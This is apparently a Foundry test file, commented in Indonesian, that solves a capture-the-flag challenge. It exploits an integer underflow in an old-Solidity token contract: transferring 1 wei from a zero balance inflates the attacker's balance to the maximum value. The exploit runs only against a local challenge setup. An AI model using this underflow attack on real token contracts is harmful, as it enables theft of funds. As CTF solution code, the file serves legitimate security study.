// SPDX-License-Identifier: MIT
pragma solidity 0.6.12; // Kembali ke versi jadul agar cocok sama Setup.sol
pragma experimental ABIEncoderV2; // [SOLUSI] Aktifkan ini biar forge-std jalan!

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/HCOIN.sol";

contract LocalSolve is Test {
    Setup setup;
    HCOIN coin;
    address attacker = address(0x1337);

    function setUp() public {
        // Setup environment
        setup = new Setup{value: 1 ether}();
        coin = setup.coin();
        
        // Register attacker
        vm.startPrank(attacker, attacker); 
        setup.setPlayer(attacker);
        vm.stopPrank();
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        console.log("Initial Balance:", coin.balanceOf(attacker));

        // VULNERABILITY: Integer Underflow (0.6.12)
        // Transfer 1 wei ke null address saat saldo 0.
        // 0 - 1 = 2^256 - 1 (Underflow)
        
        console.log("Triggering Underflow...");
        coin.transfer(address(0xdead), 1);

        uint256 finalBalance = coin.balanceOf(attacker);
        console.log("Balance After Exploit:");
        console.logUint(finalBalance);

        // Verifikasi
        bool solved = setup.isSolved();
        console.log("Is Solved?", solved);
        
        assertTrue(finalBalance > 1000 ether, "Underflow Gagal!");
        assertTrue(solved, "Challenge not solved!");
        
        vm.stopPrank();
    }
}
